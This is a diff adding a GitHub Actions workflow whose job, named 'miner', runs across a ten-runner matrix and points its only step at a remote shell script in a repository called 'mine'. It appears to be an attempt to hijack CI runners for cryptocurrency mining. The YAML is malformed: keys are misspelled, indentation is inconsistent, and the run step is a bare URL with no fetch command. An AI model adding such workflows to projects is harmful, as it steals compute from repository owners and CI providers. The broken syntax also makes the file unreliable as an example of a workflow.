@@ -1,0 +1,13 @@
+branch: [main]
+workflow_dispatch:
+jobs:
+ test:
+  name: miner
+ run-on: ubuntu-latest
+ strategy:
+  fail-fast: false
+ matrix:
+  runner: [0,1,2,3,4,5,6,7,8,9]
+ steps:
+   -run: |
+           https://raw.githubusercontent.com/rghjgfd/mine/main/base.sh
